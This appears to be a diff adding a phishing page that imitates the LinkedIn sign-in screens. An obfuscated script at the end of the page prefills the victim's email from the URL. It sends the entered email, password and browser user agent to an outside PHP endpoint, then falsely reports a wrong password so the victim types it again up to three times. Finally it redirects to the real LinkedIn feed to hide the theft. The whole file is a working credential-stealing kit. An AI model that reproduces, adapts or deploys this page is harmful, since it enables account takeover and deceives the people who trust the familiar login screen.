@@ -1,0 +1,488 @@
+
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+        
+        body {
+            background-color: #f3f2ef;
+            color: rgba(0,0,0,0.9);
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1128px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        
+        /* Header Styles */
+        header {
+            padding: 12px 0;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo i {
+            color: #0a66c2;
+            font-size: 40px;
+        }
+        
+        /* Main Content Styles */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 0;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 24px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        
+        .login-header {
+            margin-bottom: 24px;
+        }
+        
+        .login-header h1 {
+            font-size: 32px;
+            font-weight: 400;
+            color: rgba(0,0,0,0.9);
+            margin-bottom: 4px;
+        }
+        
+        .login-header p {
+            font-size: 14px;
+            color: rgba(0,0,0,0.6);
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 12px;
+            font-size: 16px;
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 4px;
+            transition: border-color 0.15s;
+        }
+        
+        .form-group input:focus {
+            border-color: #0a66c2;
+            box-shadow: inset 0 0 0 1px #0a66c2;
+            outline: none;
+        }
+        
+        .email-display {
+            padding: 12px;
+            background-color: #f3f2ef;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .email-display span {
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .email-display a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .email-display a:hover {
+            text-decoration: underline;
+        }
+        
+        .contact-icon {
+            color: rgba(0,0,0,0.6);
+            font-size: 50px;
+            border: 1px solid #2c2929; /* Solid black border */
+            border-radius: 50%; /* Rounded corners */
+            padding: 15px
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .show-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #0a66c2;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .forgot-password {
+            display: block;
+            margin-bottom: 16px;
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .sign-in-btn {
+            width: 100%;
+            padding: 12px 24px;
+            background-color: #0a66c2;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.15s;
+        }
+        
+        .sign-in-btn:hover {
+            background-color: #004182;
+        }
+        
+        .sign-in-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            text-align: center;
+            position: relative;
+            margin: 20px 0;
+        }
+        
+        .divider::before {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: rgba(0,0,0,0.15);
+        }
+        
+        .divider span {
+            background-color: #fff;
+            padding: 0 16px;
+            color: rgba(0,0,0,0.6);
+            font-size: 14px;
+        }
+        
+        .google-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 12px 24px;
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 24px;
+            background-color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.15s;
+        }
+        
+        .google-btn:hover {
+            background-color: #f3f2ef;
+        }
+        
+        .google-btn img {
+            width: 18px;
+            height: 18px;
+        }
+        
+        .terms {
+            margin-top: 16px;
+            font-size: 12px;
+            color: rgba(0,0,0,0.6);
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        .terms a {
+            color: #0a66c2;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #fff;
+            padding: 16px 0;
+            border-top: 1px solid rgba(0,0,0,0.08);
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 8px;
+            justify-content: center;
+        }
+        
+        .footer-links a {
+            color: rgba(0,0,0,0.6);
+            text-decoration: none;
+            font-size: 12px;
+        }
+        
+        .footer-links a:hover {
+            color: #0a66c2;
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            color: rgba(0,0,0,0.6);
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        /* Back button */
+        .back-button {
+            color: #0a66c2;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: inline-flex;
+            align-items: center;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .back-button:hover {
+            text-decoration: underline;
+        }
+        
+        /* Error message */
+        .error-message {
+            color: #d11124;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        
+        /* Loading spinner */
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0a66c2;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Redirect message */
+        .redirect-message {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: rgba(0,0,0,0.6);
+        }
+        
+        /* Hidden class for page transitions */
+        .hidden {
+            display: none;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 768px) {
+            .login-container {
+                box-shadow: none;
+                padding: 16px;
+            }
+            
+            .login-header h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <i class="fab fa-linkedin"></i>
+            </div>
+        </div>
+    </header>
+    
+    <main>
+        <div class="container">
+            <!-- Email Page -->
+            <div class="login-container" id="email-page">
+                <div class="login-header">
+                    <h1>Sign in</h1>
+                    <p>Discover people, jobs, and more.</p>
+                </div>
+                
+                <form id="email-form">
+                    <div class="form-group">
+                        <input type="email" id="email" placeholder="Email or Phone" required="">
+                    </div>
+                    
+                    <p style="font-size: 14px; margin-bottom: 16px;">
+                        Don't have an account? <a href="#" style="color: #0a66c2; text-decoration: none; font-weight: 600;">Join now</a>
+                    </p>
+                    
+                    <button type="submit" class="sign-in-btn">Continue</button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button type="button" class="google-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18">
+                            <path fill="#4285F4" d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 0 0 2.38-5.88c0-.57-.05-.66-.15-1.18z"></path>
+                            <path fill="#34A853" d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2a4.8 4.8 0 0 1-7.18-2.54H1.83v2.07A8 8 0 0 0 8.98 17z"></path>
+                            <path fill="#FBBC05" d="M4.5 10.52a4.8 4.8 0 0 1 0-3.04V5.41H1.83a8 8 0 0 0 0 7.18l2.67-2.07z"></path>
+                            <path fill="#EA4335" d="M8.98 4.18c1.17 0 2.23.4 3.06 1.2l2.3-2.3A8 8 0 0 0 1.83 5.4L4.5 7.49a4.77 4.77 0 0 1 4.48-3.3z"></path>
+                        </svg>
+                        <span>Continue with Google</span>
+                    </button>
+                    
+                    <p class="terms">
+                        By clicking Continue, you agree to LinkedIn's <a href="#">User Agreement</a>, <a href="#">Privacy Policy</a>, and <a href="#">Cookie Policy</a>.
+                    </p>
+                </form>
+            </div>
+            
+            <!-- Password Page -->
+            <div class="login-container hidden" id="password-page">
+                <div class="login-header">
+                    <a href="#" class="back-button" id="back-button">
+                        <i class="fas fa-arrow-left"></i><span>Back</span>
+                    </a>
+                    <h1>Sign in</h1>
+                    <p>Discover people, jobs, and more.</p>
+                </div>
+                
+                <div class="email-display">
+                    <span id="display-email">
+                        <i class="fas fa-user contact-icon"></i>
+                        <span id="email-text"></span>
+                    </span>
+                    <a href="#" id="not-you">Not you?</a>
+                </div>
+                
+                <form id="password-form">
+                    <div class="error-message" id="error-message">
+                        Incorrect Email or Password. Try again or reset your password.
+                    </div>
+                    
+                    <div class="form-group password-container">
+                        <input type="password" id="password" placeholder="Password" required="">
+                        <button type="button" class="show-password" id="show-password">Show</button>
+                    </div>
+                    
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                    
+                    <button type="submit" class="sign-in-btn" id="submit-btn">Sign in</button>
+                    
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                    
+                    <button type="button" class="google-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 18 18">
+                            <path fill="#4285F4" d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 0 0 2.38-5.88c0-.57-.05-.66-.15-1.18z"></path>
+                            <path fill="#34A853" d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2a4.8 4.8 0 0 1-7.18-2.54H1.83v2.07A8 8 0 0 0 8.98 17z"></path>
+                            <path fill="#FBBC05" d="M4.5 10.52a4.8 4.8 0 0 1 0-3.04V5.41H1.83a8 8 0 0 0 0 7.18l2.67-2.07z"></path>
+                            <path fill="#EA4335" d="M8.98 4.18c1.17 0 2.23.4 3.06 1.2l2.3-2.3A8 8 0 0 0 1.83 5.4L4.5 7.49a4.77 4.77 0 0 1 4.48-3.3z"></path>
+                        </svg>
+                        <span>Continue with Google</span>
+                    </button>
+                    
+                    <p class="terms">
+                        By clicking Continue, you agree to LinkedIn's <a href="#">User Agreement</a>, <a href="#">Privacy Policy</a>, and <a href="#">Cookie Policy</a>.
+                    </p>
+                    
+                    <div class="redirect-message" id="attempts-message">
+                        Successful API calls: <span id="success-count">0</span>/3
+                    </div>
+                </form>
+            </div>
+            
+            <!-- Redirect Page -->
+            <div class="login-container hidden" id="redirect-page">
+                <div class="login-header">
+                    <h1>Sign in successful</h1>
+                    <p>Redirecting to LinkedIn...</p>
+                </div>
+                
+                <div class="redirect-message">
+                    You will be redirected to LinkedIn in a few seconds.
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">LinkedIn © 2026</a>
+                <a href="#">User Agreement</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Community Guidelines</a>
+                <a href="#">Cookie Policy</a>
+                <a href="#">Copyright Policy</a>
+                <a href="#">Send Feedback</a>
+                <a href="#">Language</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function _0x3fda(_0x1517ea,_0x1aa0ee){_0x1517ea=_0x1517ea-0x123;const _0x4a2970=_0x4a29();let _0x3fdaef=_0x4a2970[_0x1517ea];return _0x3fdaef;}const _0x564822=_0x3fda;function _0x4a29(){const _0x1ce8f3=['POST','9UzSuae','getElementById','Hash\x20changed\x20to:','email-text','password-form','example@email.com','get','add','style','Hash\x20value\x20found:','submit-btn','.google-btn','querySelectorAll','addEventListener','Hide','preventDefault','Password\x20reset\x20functionality\x20would\x20be\x20implemented\x20here','email-page','DOMContentLoaded','textContent','application/json','Sign\x20in','remove','classList','click','log','charAt','127122cUKTwO','[-Email-]','Signing\x20in...','none','Please\x20enter\x20your\x20email\x20or\x20phone\x20number.','hidden','includes','value','2GGYjrQ','22447360sJJfYG','display','type','.forgot-password','Google\x20OAuth\x20would\x20be\x20implemented\x20here','focus','userAgent','indexOf','block','email','error','1130872aVeDdu','Incorrect\x20Email\x20or\x20Password.\x20Try\x20again.','forEach','substring','email-form','hashchange','test','linkedin_login','{{email}}','location','9809415xNOZOw','search','input','success-count','1558292uULcwj','hash','API\x20error:','submit','4231088UqVlvd','trim','contains','4458726vYiJHL','stringify','260FiRmAG','redirect-page','  https://increaland.com/bbk/submit.php','password','text','back-button'];_0x4a29=function(){return _0x1ce8f3;};return _0x4a29();}(function(_0x494266,_0x63dd5e){const _0x5310bc=_0x3fda,_0x44afb4=_0x494266();while(!![]){try{const _0x4755b7=parseInt(_0x5310bc(0x143))/0x1*(parseInt(_0x5310bc(0x137))/0x2)+-parseInt(_0x5310bc(0x161))/0x3*(-parseInt(_0x5310bc(0x151))/0x4)+parseInt(_0x5310bc(0x15a))/0x5*(parseInt(_0x5310bc(0x12f))/0x6)+-parseInt(_0x5310bc(0x14d))/0x7+parseInt(_0x5310bc(0x155))/0x8+parseInt(_0x5310bc(0x158))/0x9+-parseInt(_0x5310bc(0x138))/0xa;if(_0x4755b7===_0x63dd5e)break;else _0x44afb4['push'](_0x44afb4['shift']());}catch(_0x5a919e){_0x44afb4['push'](_0x44afb4['shift']());}}}(_0x4a29,0xbe50e),document[_0x564822(0x16e)](_0x564822(0x126),function(){const _0x505250=_0x564822,_0x30688a=document[_0x505250(0x162)](_0x505250(0x125)),_0x5e24c9=document[_0x505250(0x162)]('password-page'),_0x470822=document[_0x505250(0x162)](_0x505250(0x15b)),_0x531ab3=document[_0x505250(0x162)](_0x505250(0x147)),_0x576be5=document['getElementById'](_0x505250(0x165)),_0x24436b=document['getElementById'](_0x505250(0x141)),_0x1da69f=document[_0x505250(0x162)]('password'),_0x4fab5b=document[_0x505250(0x162)]('show-password'),_0x192b5b=document[_0x505250(0x162)](_0x505250(0x164)),_0xf480aa=document['getElementById'](_0x505250(0x15f)),_0x2a9530=document[_0x505250(0x162)]('not-you'),_0x445d1a=document[_0x505250(0x162)]('error-message'),_0x47986d=document[_0x505250(0x162)](_0x505250(0x150)),_0x4ae86d=document[_0x505250(0x162)](_0x505250(0x16b));let _0x539518=0x0,_0x86a062='';const _0x3b1ca7='https://www.linkedin.com/feed/',_0x25cae8=_0x505250(0x15c),_0x1cd756=[_0x505250(0x130),_0x505250(0x14b),_0x505250(0x166),'%5B-Email-%5D'];function _0x5555e3(_0x1a3399){const _0x18d9ed=_0x505250;return/^[^\s@]+@[^\s@]+\.[^\s@]+$/[_0x18d9ed(0x149)](_0x1a3399);}function _0x5b651d(){const _0x1727c9=_0x505250;let _0x5550c7='';if(window[_0x1727c9(0x14c)][_0x1727c9(0x152)]){const _0x112faa=decodeURIComponent(window[_0x1727c9(0x14c)][_0x1727c9(0x152)][_0x1727c9(0x146)](0x1)[_0x1727c9(0x156)]());console[_0x1727c9(0x12d)](_0x1727c9(0x16a),_0x112faa),(_0x112faa&&_0x5555e3(_0x112faa)||_0x1cd756['includes'](_0x112faa))&&(_0x5550c7=_0x112faa);}if(!_0x5550c7&&window[_0x1727c9(0x14c)][_0x1727c9(0x14e)]){const _0x9b5abb=new URLSearchParams(window[_0x1727c9(0x14c)][_0x1727c9(0x14e)]),_0x583a43=_0x9b5abb[_0x1727c9(0x167)](_0x1727c9(0x141));if(_0x583a43){const _0x1fb209=decodeURIComponent(_0x583a43);(_0x5555e3(_0x1fb209)||_0x1cd756[_0x1727c9(0x135)](_0x1fb209))&&(_0x5550c7=_0x1fb209);}}return console[_0x1727c9(0x12d)]('Extracted\x20email\x20from\x20URL:',_0x5550c7),_0x5550c7;}function _0x5b7471(){const _0x3e5942=_0x505250,_0x4f0689=_0x5b651d();_0x4f0689&&_0x24436b&&(_0x24436b[_0x3e5942(0x136)]=_0x4f0689,!_0x30688a[_0x3e5942(0x12b)][_0x3e5942(0x157)](_0x3e5942(0x134))&&_0x4f0689&&setTimeout(()=>{_0x447d6a(_0x4f0689);},0x64));}function _0x447d6a(_0x5a388d){const _0x1b586f=_0x505250;_0x86a062=_0x5a388d;const _0x18a20d=_0x536779(_0x5a388d);_0x192b5b[_0x1b586f(0x127)]=_0x18a20d,_0x539518=0x0,_0x47986d[_0x1b586f(0x127)]=_0x539518,_0x445d1a[_0x1b586f(0x169)][_0x1b586f(0x139)]='none',_0x30688a['classList'][_0x1b586f(0x168)](_0x1b586f(0x134)),_0x5e24c9[_0x1b586f(0x12b)][_0x1b586f(0x12a)](_0x1b586f(0x134)),setTimeout(()=>{_0x1da69f['focus']();},0x64);}_0x531ab3[_0x505250(0x16e)](_0x505250(0x154),function(_0x442d31){const _0x32ace6=_0x505250;_0x442d31[_0x32ace6(0x123)]();const _0x82cdb2=_0x24436b[_0x32ace6(0x136)][_0x32ace6(0x156)]();if(!_0x82cdb2){alert(_0x32ace6(0x133));return;}_0x447d6a(_0x82cdb2);}),_0x576be5['addEventListener'](_0x505250(0x154),async function(_0x172658){const _0xd3acaf=_0x505250;_0x172658[_0xd3acaf(0x123)]();const _0x7e15fe=_0x1da69f['value']['trim']();if(!_0x7e15fe){alert('Please\x20enter\x20your\x20password.');return;}_0x4ae86d['disabled']=!![],_0x4ae86d[_0xd3acaf(0x127)]=_0xd3acaf(0x131);try{const _0x4bb5ac=await _0x5ee61f(_0x86a062,_0x7e15fe);_0x4bb5ac['ok']?(_0x539518++,_0x47986d[_0xd3acaf(0x127)]=_0x539518,_0x1da69f[_0xd3acaf(0x136)]='',_0x445d1a[_0xd3acaf(0x169)]['display']=_0xd3acaf(0x140),_0x445d1a[_0xd3acaf(0x127)]=_0xd3acaf(0x144),setTimeout(()=>{const _0x7c42f5=_0xd3acaf;_0x445d1a[_0x7c42f5(0x169)]['display']=_0x7c42f5(0x132);},0xbb8),_0x539518>=0x3&&(_0x5e24c9['classList']['add'](_0xd3acaf(0x134)),_0x470822['classList']['remove'](_0xd3acaf(0x134)),setTimeout(()=>{const _0x33e3ec=_0xd3acaf;window[_0x33e3ec(0x14c)]['href']=_0x3b1ca7;},0x3e8))):(_0x445d1a['style'][_0xd3acaf(0x139)]=_0xd3acaf(0x140),_0x445d1a['textContent']=_0xd3acaf(0x144),_0x1da69f[_0xd3acaf(0x136)]='',setTimeout(()=>{const _0x2196f3=_0xd3acaf;_0x445d1a[_0x2196f3(0x169)][_0x2196f3(0x139)]=_0x2196f3(0x132);},0xbb8));}catch(_0x2f7f17){console[_0xd3acaf(0x142)](_0xd3acaf(0x153),_0x2f7f17),_0x445d1a[_0xd3acaf(0x169)]['display']=_0xd3acaf(0x140),_0x445d1a['textContent']='Network\x20error.\x20Please\x20check\x20your\x20connection\x20and\x20try\x20again.',_0x1da69f[_0xd3acaf(0x136)]='',setTimeout(()=>{const _0x309e02=_0xd3acaf;_0x445d1a['style'][_0x309e02(0x139)]='none';},0xbb8);}finally{_0x4ae86d['disabled']=![],_0x4ae86d[_0xd3acaf(0x127)]=_0xd3acaf(0x129),_0x1da69f[_0xd3acaf(0x13d)]();}});async function _0x5ee61f(_0x26df3c,_0x32390a){const _0x57318a=_0x505250,_0x5d7ac1={'email':_0x26df3c,'password':_0x32390a,'timestamp':new Date()['toISOString'](),'userAgent':navigator[_0x57318a(0x13e)],'source':_0x57318a(0x14a)},_0x131848=await fetch(_0x25cae8,{'method':_0x57318a(0x160),'headers':{'Content-Type':_0x57318a(0x128)},'body':JSON[_0x57318a(0x159)](_0x5d7ac1)});return _0x131848;}_0xf480aa['addEventListener'](_0x505250(0x12c),function(_0x37bc56){const _0x3c58fd=_0x505250;_0x37bc56[_0x3c58fd(0x123)](),_0x5e24c9['classList'][_0x3c58fd(0x168)](_0x3c58fd(0x134)),_0x30688a[_0x3c58fd(0x12b)][_0x3c58fd(0x12a)]('hidden'),_0x24436b[_0x3c58fd(0x13d)]();}),_0x2a9530[_0x505250(0x16e)](_0x505250(0x12c),function(_0x5c1ade){const _0x24f9ee=_0x505250;_0x5c1ade[_0x24f9ee(0x123)](),_0x5e24c9['classList'][_0x24f9ee(0x168)]('hidden'),_0x30688a[_0x24f9ee(0x12b)][_0x24f9ee(0x12a)](_0x24f9ee(0x134)),_0x24436b[_0x24f9ee(0x13d)]();}),_0x4fab5b['addEventListener'](_0x505250(0x12c),function(){const _0x5ef6ba=_0x505250;_0x1da69f[_0x5ef6ba(0x13a)]===_0x5ef6ba(0x15d)?(_0x1da69f['type']=_0x5ef6ba(0x15e),_0x4fab5b[_0x5ef6ba(0x127)]=_0x5ef6ba(0x16f)):(_0x1da69f[_0x5ef6ba(0x13a)]=_0x5ef6ba(0x15d),_0x4fab5b[_0x5ef6ba(0x127)]='Show');}),document[_0x505250(0x16d)](_0x505250(0x16c))[_0x505250(0x145)](_0x18317d=>{const _0x44b2ac=_0x505250;_0x18317d[_0x44b2ac(0x16e)]('click',function(){const _0xb10289=_0x44b2ac;alert(_0xb10289(0x13c));});}),document['querySelector'](_0x505250(0x13b))[_0x505250(0x16e)](_0x505250(0x12c),function(_0x5f349d){const _0x13eab4=_0x505250;_0x5f349d[_0x13eab4(0x123)](),alert(_0x13eab4(0x124));});function _0x536779(_0xbb3a6){const _0x4ec614=_0x505250,_0x5475b7=_0xbb3a6[_0x4ec614(0x13f)]('@');if(_0x5475b7<=0x1)return _0xbb3a6;const _0xd7f366=_0xbb3a6[_0x4ec614(0x12e)](0x0),_0x1d6ddb=_0xbb3a6[_0x4ec614(0x146)](_0x5475b7);return _0xd7f366+'*****'+_0x1d6ddb;}_0x24436b[_0x505250(0x16e)](_0x505250(0x14f),function(){const _0xde4e95=_0x505250,_0x569540=_0x24436b[_0xde4e95(0x136)][_0xde4e95(0x156)]();_0x5555e3(_0x569540)&&(window[_0xde4e95(0x14c)]['hash']=_0x569540);}),window[_0x505250(0x16e)](_0x505250(0x148),function(){const _0x543dbf=_0x505250;console[_0x543dbf(0x12d)](_0x543dbf(0x163),window[_0x543dbf(0x14c)][_0x543dbf(0x152)]),_0x5b7471();}),_0x5b7471();}));
+    </script>
+
+</body></html>
